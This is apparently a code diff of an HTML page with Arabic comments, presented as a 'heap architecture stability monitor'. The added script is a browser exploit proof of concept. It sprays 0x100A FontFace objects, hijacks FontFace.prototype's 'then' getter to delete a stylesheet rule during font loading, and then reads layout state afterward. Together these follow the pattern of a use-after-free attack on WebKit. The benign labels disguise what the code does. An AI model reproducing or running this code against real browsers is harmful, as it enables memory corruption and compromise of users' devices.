@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>تحليل نطاق المستخدم المستقر - تفادي OOM</title>
+    <title>تفكيك جمود المعمارية - الهيكلية المستقرة</title>
     <style>
         body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
         #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
@@ -17,8 +17,8 @@
 </head>
 <body>
 
-    <h2>مراقبة استقرار معمارية الـ Userland</h2>
-    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار استقرار المستند...</div>
+    <h2>مراقبة استقرار معمارية الـ Heap التاريخية</h2>
+    <div id="custom-console">[نظام المحاكاة نشط]: جاري تهيئة البيئة...</div>
 
     <script>
         const consoleElement = document.getElementById('custom-console');
@@ -32,17 +32,64 @@
             consoleElement.scrollTop = consoleElement.scrollHeight;
         }
 
-        var font_recycler = [];
+        // إعداد المصفوفة الأساسية وتحديد حجم الحشو المتوافق تاريخياً مع معمارية المتصفح
+        var bad_fonts = [];
+        var SPRAY_FONTS = 0x100A; // القيمة الافتراضية المستقرة من ملف webkit.js
 
-        function runUserlandStabilization() {
+        function setupHistoricalEnvironment() {
             consoleElement.innerHTML = "";
-            screenLog("بدء تشغيل الفحص الهندسي المستقر...");
+            screenLog("بدء تهيئة الذاكرة التمهيدية (Heap Pre-Padding)...");
 
             try {
+                // حقن مسبق هادئ ومنظم لتجهيز قسم الخطوط المعزول
+                for (var i = 0; i < SPRAY_FONTS; i++) {
+                    bad_fonts.push(new FontFace("font1", "", {}));
+                }
+                screenLog(`تم تجهيز ${SPRAY_FONTS} كائن خط بنجاح في الذاكرة المستقرة.`);
+
+                // إعداد كائن الفحص الأساسي
                 let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-                document.fonts.add(A);
+                bad_fonts.push(A);
                 void A.loaded;
 
                 let fired = false;
 
-                Object.defineProperty(FontFace.prototype,
+                // كمين المقاطعة المنطقية المستقر
+                Object.defineProperty(FontFace.prototype, 'then', {
+                    configurable: true,
+                    get() {
+                        if (!fired && this === A) {
+                            fired = true;
+                            screenLog("!! تم تفعيل الكمين المنطقي للـ Getter بنجاح !!", "warn");
+                            
+                            try {
+                                document.getElementById('s').sheet.deleteRule(0);
+                                screenLog("تم حذف القاعدة التنسيقية وتوليد الفجوة الهيكلية.");
+                            } catch(e) { screenLog("خطأ الحذف: " + e.message, "warn"); }
+                            
+                            // نترك المتصفح يكمل التنفيذ دون حشو مصفوفات عشوائية لمنع الـ OOM
+                            setTimeout(() => {
+                                screenLog("محاولة القراءة المتأخرة للتحقق من استجابة المحرك...");
+                                let offset = document.body.offsetTop;
+                                screenLog("قيمة الـ Offset المسترجعة: " + offset);
+                            }, 50);
+                        }
+                        return function(resolve) { if (resolve) resolve(); };
+                    }
+                });
+
+                screenLog("إطلاق طلب معالجة الخط عبر الـ Layout Pipeline...");
+                document.fonts.load('1em x', 'AB');
+
+            } catch (err) {
+                screenLog("خطأ عام في النظام: " + err.message, "warn");
+            }
+        }
+
+        // جدولة التشغيل بعد مهلة استقرار كافية لمنع تداخل عمليات التحميل السابقة
+        window.onload = () => {
+            setTimeout(setupHistoricalEnvironment, 1500);
+        };
+    </script>
+</body>
+</html>
